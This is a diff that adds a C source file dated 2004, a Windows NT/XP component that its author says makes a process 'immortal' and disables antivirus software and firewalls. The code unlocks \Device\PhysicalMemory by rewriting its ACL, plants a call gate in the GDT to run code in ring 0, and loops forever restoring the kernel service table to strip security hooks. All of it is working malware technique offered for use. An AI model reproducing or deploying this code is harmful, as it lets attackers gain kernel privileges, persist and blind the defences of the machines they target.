@@ -1,0 +1,519 @@
+/*
+ *  This code is public domain, of course ;)
+ *
+ *  INFO: The following code does two things:
+ *
+ *     1) Makes your process immortal
+ *        - Windows won't terminate a process that is running kernel-mode code.
+ *
+ *     2) Disables AV software, system (not network!) firewalls etc
+ *        - kernel service table is restored from NTOSKRNL.EXE,
+ *          thus detaching all hookers
+ *
+ *  Call InitWindowsNT(), as this is a part of my project.
+ *
+ *  (C) June 2004, Microprocessor <micro@htn.pl>
+ *
+ */
+
+
+
+NTSTATUS (NTAPI * NtOpenSection) (OUT PHANDLE SectionHandle,
+                                  IN ACCESS_MASK DesiredAccess,
+                                  IN POBJECT_ATTRIBUTES ObjectAttributes);
+
+LIBEXPORT NtDllExports[] = {
+	{"NtOpenSection", (PVOID *) &NtOpenSection},
+	{NULL, NULL}
+};
+
+PVOID (NTAPI * ExAllocatePool) (IN POOL_TYPE PoolType,
+                                IN SIZE_T NumberOfBytes);
+VOID (NTAPI * ExFreePool) (IN PVOID P);
+NTSTATUS (NTAPI * KeDelayExecutionThread) (IN ULONG WaitMode,
+                                           IN BOOLEAN Alertable,
+                                           IN PLARGE_INTEGER Interval);
+PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;
+NTSTATUS (NTAPI * ZwClose) (IN HANDLE Handle);
+NTSTATUS (NTAPI * ZwOpenFile) (OUT PHANDLE FileHandle,
+                               IN ACCESS_MASK DesiredAccess,
+                               IN POBJECT_ATTRIBUTES ObjectAttributes,
+                               OUT PULONG IoStatusBlock,
+                               IN ULONG ShareAccess,
+                               IN ULONG OpenOptions);
+NTSTATUS (NTAPI * ZwQuerySystemInformation) (IN ULONG SystemInformationClass,
+                                             OUT PVOID SystemInformation,
+                                             IN ULONG SystemInformationLength,
+                                             OUT PULONG ReturnLength OPTIONAL);
+NTSTATUS (NTAPI * ZwReadFile) (IN HANDLE FileHandle,
+                               IN HANDLE Event OPTIONAL,
+                               IN PVOID ApcRoutine OPTIONAL,
+                               IN PVOID ApcContext OPTIONAL,
+                               OUT PULONG IoStatusBlock,
+                               OUT PVOID Buffer,
+                               IN ULONG Length,
+                               IN PLARGE_INTEGER ByteOffset OPTIONAL,
+                               IN PULONG Key OPTIONAL);
+
+LIBEXPORT KernelExports[] = {
+	{"ExAllocatePool", (PVOID *) &ExAllocatePool},
+	{"ExFreePool", (PVOID *) &ExFreePool},
+	{"KeDelayExecutionThread", (PVOID *) &KeDelayExecutionThread},
+	{"KeServiceDescriptorTable", (PVOID *) &KeServiceDescriptorTable},
+	{"ZwClose", (PVOID *) &ZwClose},
+	{"ZwOpenFile", (PVOID *) &ZwOpenFile},
+	{"ZwQuerySystemInformation", (PVOID *) &ZwQuerySystemInformation},
+	{"ZwReadFile", (PVOID *) &ZwReadFile},
+	{NULL, NULL}
+};
+
+typedef struct __attribute__ ((packed)) _XDT_GATE_DESCRIPTOR {
+	WORD OffsetLo;
+	WORD Selector;
+	WORD Attributes;
+	WORD OffsetHi;
+} XDT_GATE_DESCRIPTOR, *PXDT_GATE_DESCRIPTOR;
+
+struct __attribute__ ((packed)) XDTR {
+	WORD Limit;
+	DWORD Base;
+};
+
+/*
+ * Gives us write access to the section object identified by ObjectAttributes.
+ */
+
+VOID FASTCALL
+UpdateSectionAcl(POBJECT_ATTRIBUTES ObjectAttributes)
+{
+	DWORD (WINAPI * GetSecurityInfo) (HANDLE, SE_OBJECT_TYPE,
+		SECURITY_INFORMATION, PSID *, PSID *, PACL *, PACL *,
+		PSECURITY_DESCRIPTOR *);
+	DWORD (WINAPI * SetSecurityInfo) (HANDLE, SE_OBJECT_TYPE,
+		SECURITY_INFORMATION, PSID, PSID, PACL, PACL);
+	LIBEXPORT AdvApi32Exports[] = {
+		{"GetSecurityInfo", (PVOID *) &GetSecurityInfo},
+		{"SetSecurityInfo", (PVOID *) &SetSecurityInfo},
+		{NULL, NULL}
+	};
+	HANDLE Handle;
+	DWORD Length;
+	PSID_AND_ATTRIBUTES UserInfo;
+	NTSTATUS status;
+	PACL OldAcl, NewAcl;
+	PSECURITY_DESCRIPTOR SecurityDescriptor;
+
+	LoadExports((DWORD) LoadLibrary("ADVAPI32"), AdvApi32Exports);
+
+	//
+	// Get my SID
+	//
+
+	if (!OpenProcessToken(NT_CURRENT_PROCESS, TOKEN_QUERY, &Handle))
+		return;
+
+	GetTokenInformation(Handle, TokenUser, NULL, 0, &Length);
+	UserInfo = (PSID_AND_ATTRIBUTES) GlobalAlloc(0, Length);
+
+	if (!GetTokenInformation(Handle, TokenUser, UserInfo, Length, &Length))
+	{
+		CloseHandle(Handle);
+	Error:
+		GlobalFree(UserInfo);
+		return;
+	}
+
+	CloseHandle(Handle);
+
+	//
+	// Open the section object and read the original ACL
+	//
+
+	status = NtOpenSection( &Handle,
+	                        WRITE_DAC | READ_CONTROL,
+	                        ObjectAttributes );
+
+	if (!NT_SUCCESS(status))
+		goto Error;
+
+	if (GetSecurityInfo(Handle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
+		NULL, NULL, &OldAcl, NULL, &SecurityDescriptor))
+	{
+		CloseHandle(Handle);
+		goto Error;
+	}
+
+	//
+	// Create the new ACL
+	//
+
+	Length = 12 + GetLengthSid(UserInfo->Sid);
+	NewAcl = (PACL) GlobalAlloc(0, OldAcl->AclSize + Length);
+	memcpy(NewAcl, OldAcl, OldAcl->AclSize);
+
+	NewAcl->AclSize += (WORD) Length;
+	AddAccessAllowedAce(NewAcl, ACL_REVISION, SECTION_ALL_ACCESS,
+		UserInfo->Sid);
+	
+	SetSecurityInfo(Handle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL,
+		NULL, NewAcl, NULL);
+
+	GlobalFree(NewAcl);
+	GlobalFree(SecurityDescriptor);
+	CloseHandle(Handle);
+	GlobalFree(UserInfo);
+}
+
+/*
+ * Finds NTOSKRNL.EXE image in memory. We start from the int0 handler
+ * and walk down page by page until we find appropriate signatures.
+ */
+
+DWORD
+FindKernelInMemory()
+{
+	XDTR idtr;
+	PXDT_GATE_DESCRIPTOR idt;
+	PIMAGE_DOS_HEADER Header;
+
+	asm("sidt    %0" : "=m" (idtr));
+
+	idt = (PXDT_GATE_DESCRIPTOR) idtr.Base;
+
+	Header = (PIMAGE_DOS_HEADER) (((idt->OffsetHi << 16) + idt->OffsetLo)
+        & 0xfffff000);
+
+	while (Header->e_magic != IMAGE_DOS_SIGNATURE ||
+		*(PDWORD) (Header->e_lfanew + (DWORD)Header) != IMAGE_NT_SIGNATURE)
+	{
+		Header = (PIMAGE_DOS_HEADER) ((DWORD)Header - 4096);
+	}
+
+	return (DWORD)Header;
+}
+
+/*
+ * Prepares a copy of original, built-in kernel service table.
+ */
+
+PULONG FASTCALL
+LoadServiceTable(DWORD KernelBase)
+{
+	//
+	// Are we still using the internal KiServiceTable?
+	//
+
+	if ((DWORD) KeServiceDescriptorTable->Base > (DWORD)
+		KeServiceDescriptorTable)
+		return NULL;
+
+	DWORD nbytes = KeServiceDescriptorTable->Limit * 4;
+
+	//
+	// Open NTOSKRNL.EXE file
+	//
+
+	UNICODE_STRING fileName;
+	OBJECT_ATTRIBUTES objectAttributes;
+	ULONG ioStatus[2];
+	HANDLE fileHandle;
+
+	RtlInitUnicodeString(&fileName, L"\\SystemRoot\\SYSTEM32\\NTOSKRNL.EXE");
+
+	InitializeObjectAttributes( &objectAttributes,
+	                            &fileName,
+	                            OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
+	                            NULL,
+	                            NULL );
+
+	NTSTATUS status = ZwOpenFile( &fileHandle,
+	                              GENERIC_READ,
+	                              &objectAttributes,
+	                              ioStatus,
+	                              FILE_SHARE_READ,
+	                              FILE_RANDOM_ACCESS );
+
+	if (!NT_SUCCESS(status))
+		return NULL;
+
+	//
+	// Allocate paged memory for the table
+	//
+
+	PULONG KiServiceTable = (PULONG) ExAllocatePool(PagedPool, nbytes);
+
+	if (!KiServiceTable)
+	{
+		ZwClose(fileHandle);
+		return NULL;
+	}
+
+	//
+	// Read it into memory
+	//
+
+	__int64 Offset = (DWORD) KeServiceDescriptorTable->Base - KernelBase;
+
+	status = ZwReadFile( fileHandle,
+	                     NULL,
+	                     NULL,
+	                     NULL,
+	                     ioStatus,
+	                     KiServiceTable,
+	                     nbytes,
+	                     (PLARGE_INTEGER) &Offset,
+	                     NULL );
+
+	ZwClose(fileHandle);
+
+	if (!NT_SUCCESS(status))
+	{
+		ExFreePool(KiServiceTable);
+		return NULL;
+	}
+
+	//
+	// Relocate table entries (ImageBase is 0x00400000 or so)
+	//
+
+	DWORD Delta = KernelBase - ((PIMAGE_OPTIONAL_HEADER) (KernelBase +
+		((PIMAGE_DOS_HEADER) KernelBase)->e_lfanew + 4 +
+		sizeof(IMAGE_FILE_HEADER)))->ImageBase;
+
+	for (DWORD Index = 0; Index < KeServiceDescriptorTable->Limit; Index++)
+		KiServiceTable[Index] += Delta;
+
+	return KiServiceTable;
+}
+
+/*
+ * This is our Ring-0 thread, executed only if we have admin rights
+ * and \Device\PhysicalMemory is not protected. It will never exit,
+ * effectively making our process immortal.
+ */
+
+VOID
+Ring0Main()
+{
+	DWORD KernelBase;
+	PULONG KiServiceTable;
+
+	//
+	// Locate NTOSKRNL exports
+	//
+
+	KernelBase = FindKernelInMemory();
+
+	if (!LoadExports(KernelBase, KernelExports))
+		ExitThread(0);
+
+	//
+	// Prepare original kernel service table
+	//
+
+	KiServiceTable = LoadServiceTable(KernelBase);
+
+	while (1 == 1)
+	{
+		LARGE_INTEGER WaitInterval;
+        
+		//
+		// Restore service table, if possible
+		//
+        
+		if (KiServiceTable && (DWORD) KeServiceDescriptorTable->Base <
+			(DWORD)	KeServiceDescriptorTable)
+		{
+			for (DWORD idx = 0; idx < KeServiceDescriptorTable->Limit; idx++)
+				KeServiceDescriptorTable->Base[idx] = KiServiceTable[idx];
+		}
+        
+		//
+		// Halt execution for 5s
+		//
+        
+		WaitInterval.QuadPart = -50000000;
+		KeDelayExecutionThread(0, FALSE, &WaitInterval);
+	}
+}
+
+/*
+ * Standard Ring-0 startup code, deals with kernel housekeeping.
+ * Allows us to access paged memory.
+ */
+
+VOID
+Ring0Startup()
+{
+	asm(
+		//
+		// Prolog, set up trap frame
+		//
+		
+		"pushal\n\t"
+		"pushfl\n\t"
+		"pushl   %fs\n\t"
+		
+		"movl    $0x30, %ebx\n\t"
+		"movw    %bx, %fs\n\t"
+		"subl    $0x50, %esp\n\t"
+		"movl    %esp, %ebp\n\t"
+		
+		//
+		// Setup the exception frame to NULL
+		//
+		
+		"movl    %cs:(0xffdff000), %ebx\n\t"
+		"movl    $0xffffffff, (0xffdff000)\n\t"
+		"movl    %ebx, (%ebp)\n\t"
+		
+		//
+		// Save away the existing KSS EBP
+		//
+		
+		"movl    %cs:(0xffdff124), %esi\n\t"
+		"movl    0x128(%esi), %ebx\n\t"
+		"movl    %ebx, 4(%ebp)\n\t"
+		"movl    %ebp, 0x128(%esi)\n\t"
+		
+		//
+		// Save away the kernel time and the thread mode (kernel/user)
+		//
+		
+		"movl    0x137(%esi), %edi\n\t"
+		"movl    %edi, 8(%ebp)\n\t"
+		
+		//
+		// Set the thread mode (kernel/user)
+		//
+		
+		"movb    $1, 0x137(%esi)\n\t"
+		
+		//
+		// Free the call-gate descriptor
+		//
+		
+		"pushl   %edx\n\t"
+		"sgdt    -2(%esp)\n\t"
+		"popl    %edx\n\t"
+		
+		"xorl    %eax, %eax\n\t"
+		"leal    (%edx,%ecx,8), %edi\n\t"
+		"stosl\n\t"
+		"stosl\n\t"
+		
+		"sti\n\t"
+		"jmp     __Z9Ring0Mainv"
+	);
+}
+
+/*
+ * A separate thread that will transfer execution to our Ring-0 code
+ */
+
+VOID WINAPI
+EnterRing0(PXDT_GATE_DESCRIPTOR gdt)
+{
+	DWORD CodeIndex, GateIndex;
+	WORD CallGate[3];
+
+	//
+	// Find and initialize GDT descriptors for code segment and call gate
+	//
+
+	CodeIndex = 10;
+	while (gdt[CodeIndex].Attributes & 0xf000)
+		CodeIndex++;
+	gdt[CodeIndex] = gdt[1];
+	
+	GateIndex = CodeIndex + 1;
+	while (gdt[GateIndex].Attributes & 0xf000)
+		GateIndex++;
+
+	gdt[GateIndex].OffsetLo = (WORD) ((DWORD) &Ring0Startup);
+	gdt[GateIndex].Selector = CodeIndex << 3;
+	gdt[GateIndex].Attributes = 0xec00;
+	gdt[GateIndex].OffsetHi = (WORD) ((DWORD) &Ring0Startup >> 16);
+
+	UnmapViewOfFile(gdt);
+
+	CallGate[2] = (GateIndex << 3) | 3;
+	asm("lcall   *%0" : : "m" (CallGate[0]), "c" (GateIndex));
+}
+
+/*
+ * Initializes Windows NT/2000/XP/2003 dependent stuff.
+ */
+
+BOOLEAN
+InitWindowsNT()
+{
+	UNICODE_STRING ObjectName;
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	NTSTATUS status;
+	HANDLE SectionHandle;
+    
+	//
+	// Locate NTDLL exports
+	//
+
+	if (!LoadExports((DWORD) LoadLibrary("NTDLL"), NtDllExports))
+		return FALSE;
+
+	//
+	// Setup R/W access to the physical memory.
+	//
+
+	RtlInitUnicodeString(&ObjectName, L"\\Device\\PhysicalMemory");
+	InitializeObjectAttributes(&ObjectAttributes, &ObjectName,
+		OBJ_CASE_INSENSITIVE, NULL, NULL);
+	
+	status = NtOpenSection( &SectionHandle,
+	                        SECTION_MAP_READ | SECTION_MAP_WRITE,
+	                        &ObjectAttributes );
+
+	if (!NT_SUCCESS(status))
+	{
+		UpdateSectionAcl(&ObjectAttributes);
+		
+		status = NtOpenSection( &SectionHandle,
+		                        SECTION_MAP_READ | SECTION_MAP_WRITE,
+		                        &ObjectAttributes );
+	}
+
+	if (NT_SUCCESS(status))
+	{
+		XDTR gdtr;
+        
+		//
+		// Ring0EntryPoint must be in physical memory during the mode
+		// switch, because at that time swapping is not possible yet.
+		//
+        
+		VirtualLock((LPVOID) &Ring0Startup, (DWORD) &EnterRing0 - (DWORD)
+			&Ring0Startup);
+        
+		//
+		// Obtain a linear address of the GDT and transform it into
+		// a physical address. Then, map it into our address space
+		//
+        
+		asm("sgdt    %0" : : "m" (gdtr));
+        
+		gdtr.Base &= 0x0ffff000;
+        
+		PVOID gdt = MapViewOfFile( SectionHandle,
+		                           FILE_MAP_READ | FILE_MAP_WRITE,
+		                           0,
+		                           gdtr.Base,
+		                           gdtr.Limit + 1 );
+        
+		CloseHandle(SectionHandle);
+        
+		if (gdt)
+			CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)
+				EnterRing0, gdt, 0, NULL));
+	}
+
+	return TRUE;
+}
